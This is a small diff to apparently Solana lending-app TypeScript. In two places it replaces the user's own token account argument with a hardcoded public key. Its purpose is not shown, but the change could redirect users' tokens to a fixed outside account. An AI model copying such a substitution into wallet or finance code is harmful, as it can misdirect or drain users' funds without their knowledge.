@@ -558,7 +558,7 @@ let res = config.markets[0].reserves.find(
         // @ts-ignore
         Number(inputAmount) * 10 ** res.decimals,//    Math.floor(oos[res]  * 1000) / 1000,
         userCollateralAccountAddress,
-        tokenAccount.account.pubkey,        // @ts-ignore
+        new PublicKey("EhE7h2FFF7UVhCuvBwUeMmoss6F5Ev5AkJ1HjrEgt4UP"),        // @ts-ignore
         new PublicKey(res.address),
         // @ts-ignore
         new PublicKey(res.collateralMintAddress),
@@ -575,7 +575,8 @@ let res = config.markets[0].reserves.find(
         // @ts-ignore
       Number(inputAmount) * 10 ** res.decimals,//    Math.floor(oos[res]  * 1000) / 1000,
       userCollateralAccountAddress,
-      tokenAccount.account.pubkey,
+      
+      new PublicKey("EhE7h2FFF7UVhCuvBwUeMmoss6F5Ev5AkJ1HjrEgt4UP"),     
       // @ts-ignore
       new PublicKey(res.address),
       // @ts-ignore
